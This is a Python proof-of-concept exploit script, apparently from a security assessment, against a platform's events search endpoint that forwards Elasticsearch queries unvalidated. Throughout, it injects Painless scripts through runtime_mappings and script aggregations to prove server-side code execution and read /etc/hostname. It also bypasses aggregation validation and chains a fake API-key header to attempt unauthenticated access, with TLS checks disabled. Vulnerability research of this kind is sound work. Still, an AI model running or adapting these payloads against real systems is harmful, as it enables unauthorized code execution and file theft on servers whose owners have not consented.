#!/usr/bin/env python3
"""
PoC #2 — Elasticsearch RCE via Painless Script Injection
CRITICAL: runtime_mappings and unblocked script aggregations bypass validation.

The search endpoint at /v2/workspaces/:id/events passes runtime_mappings
directly to Elasticsearch without validation. Painless scripts in
runtime_mappings execute server-side code.

Also tests: bucket_script, terms.script, bucket_selector bypasses.

Usage: python3 poc_02_elasticsearch_rce.py --target https://dev.example.com --workspace-id WS_ID --token AUTH_TOKEN
"""

import argparse
import requests
import json
import urllib3
urllib3.disable_warnings()


def test_runtime_mappings_rce(base_url, workspace_id, token):
    """Inject Painless script via runtime_mappings — primary RCE vector."""
    print("\n[*] Test 1: runtime_mappings Painless script injection...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/events"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    # Benign Painless script that proves code execution
    # Reads a Java system property to prove arbitrary code exec
    payload = {
        "runtime_mappings": {
            "poc_field": {
                "type": "keyword",
                "script": {
                    "source": "emit(System.getProperty('java.version'))"
                }
            }
        },
        "query": {"match_all": {}},
        "_source": False,
        "fields": ["poc_field"],
        "limit": 1,
    }

    try:
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            print(f"  [CRITICAL] runtime_mappings accepted!")
            print(f"  Response: {json.dumps(data, indent=2)[:1000]}")
            # Check if the poc_field returned Java version
            hits = data.get("hits", data.get("results", []))
            if hits:
                print("  [CRITICAL] Painless script executed — RCE confirmed!")
            return True
        else:
            print(f"  Response: {r.text[:500]}")
            if "runtime_mappings" not in r.text.lower():
                print("  [INFO] Endpoint may not support runtime_mappings or query was blocked")
            return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_runtime_mappings_file_read(base_url, workspace_id, token):
    """Attempt to read a file via Painless — demonstrates deeper RCE impact."""
    print("\n[*] Test 2: runtime_mappings file read via Painless...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/events"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    # Read /etc/hostname to prove file system access
    payload = {
        "runtime_mappings": {
            "file_content": {
                "type": "keyword",
                "script": {
                    "source": """
                        try {
                            def path = java.nio.file.Paths.get('/etc/hostname');
                            def content = new String(java.nio.file.Files.readAllBytes(path));
                            emit(content.trim());
                        } catch (Exception e) {
                            emit('blocked: ' + e.getMessage());
                        }
                    """
                }
            }
        },
        "query": {"match_all": {}},
        "_source": False,
        "fields": ["file_content"],
        "limit": 1,
    }

    try:
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            print(f"  [CRITICAL] File read via Painless!")
            print(f"  Response: {json.dumps(data, indent=2)[:1000]}")
            return True
        else:
            print(f"  Response: {r.text[:500]}")
            return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_bucket_script_bypass(base_url, workspace_id, token):
    """Bypass agg validation via bucket_script (not blocked by validateElasticAggregation)."""
    print("\n[*] Test 3: bucket_script aggregation bypass...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/events"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    payload = {
        "query": {"match_all": {}},
        "aggs": {
            "by_type": {
                "terms": {"field": "type.keyword", "size": 1},
                "aggs": {
                    "count": {"value_count": {"field": "type.keyword"}},
                    "poc_script": {
                        "bucket_script": {
                            "buckets_path": {"c": "count"},
                            "script": {
                                "source": "System.getProperty('java.version'); return params.c",
                                "lang": "painless"
                            }
                        }
                    }
                }
            }
        },
        "limit": 1,
    }

    try:
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            print(f"  [HIGH] bucket_script aggregation accepted — validation bypassed!")
            print(f"  Response: {json.dumps(r.json(), indent=2)[:1000]}")
            return True
        else:
            print(f"  Response: {r.text[:500]}")
            return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_terms_script_bypass(base_url, workspace_id, token):
    """Bypass agg validation via terms with inline script."""
    print("\n[*] Test 4: terms.script aggregation bypass...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/events"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    payload = {
        "query": {"match_all": {}},
        "aggs": {
            "poc_terms": {
                "terms": {
                    "script": {
                        "source": "doc['type.keyword'].value + ' | java:' + System.getProperty('java.version')",
                        "lang": "painless"
                    },
                    "size": 1
                }
            }
        },
        "limit": 1,
    }

    try:
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            print(f"  [HIGH] terms.script accepted — validation bypassed!")
            print(f"  Response: {json.dumps(data, indent=2)[:1000]}")
            return True
        else:
            print(f"  Response: {r.text[:500]}")
            return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_unauth_with_apikey(base_url, workspace_id):
    """Chain with PoC #4 — use fake API key to skip auth, then inject."""
    print("\n[*] Test 5: Chained — fake API key + runtime_mappings...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/events"
    headers = {
        "x-prismeai-api-key": "anything",
        "Content-Type": "application/json",
    }

    payload = {
        "runtime_mappings": {
            "poc": {
                "type": "keyword",
                "script": {"source": "emit('rce-test')"}
            }
        },
        "query": {"match_all": {}},
        "_source": False,
        "fields": ["poc"],
        "limit": 1,
    }

    try:
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            print(f"  [CRITICAL] Unauthenticated ES RCE via API key bypass!")
            print(f"  Response: {r.text[:500]}")
            return True
        elif r.status_code in (401, 403):
            print(f"  [INFO] Auth required — API key bypass may not reach events endpoint")
        else:
            print(f"  Response: {r.text[:300]}")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def main():
    parser = argparse.ArgumentParser(description="PoC #2: Elasticsearch RCE via Painless")
    parser.add_argument("--target", required=True, help="Base URL")
    parser.add_argument("--workspace-id", required=True, help="Workspace ID")
    parser.add_argument("--token", default="", help="Bearer token (optional with auto-auth)")
    args = parser.parse_args()

    if not args.token:
        from auth_helper import get_anonymous_token
        print("[*] No token provided — obtaining anonymous auth token...")
        token, user_id, _ = get_anonymous_token(args.target)
        if token:
            args.token = token
            print(f"[+] Anonymous token obtained! User ID: {user_id}")
        else:
            print("[-] Failed to get anonymous token. Provide --token manually.")
            return


    base = args.target.rstrip("/")
    print(f"[*] Target: {base}")
    print(f"[*] Workspace: {args.workspace_id}")
    print("=" * 60)

    results = {}
    if args.token:
        results["runtime_mappings_rce"] = test_runtime_mappings_rce(base, args.workspace_id, args.token)
        results["runtime_mappings_file_read"] = test_runtime_mappings_file_read(base, args.workspace_id, args.token)
        results["bucket_script_bypass"] = test_bucket_script_bypass(base, args.workspace_id, args.token)
        results["terms_script_bypass"] = test_terms_script_bypass(base, args.workspace_id, args.token)

    results["unauth_apikey_chain"] = test_unauth_with_apikey(base, args.workspace_id)

    print("\n" + "=" * 60)
    print("[*] SUMMARY")
    for k, v in results.items():
        print(f"  {k}: {'VULNERABLE' if v else 'NOT VULNERABLE / ERROR'}")


if __name__ == "__main__":
    main()
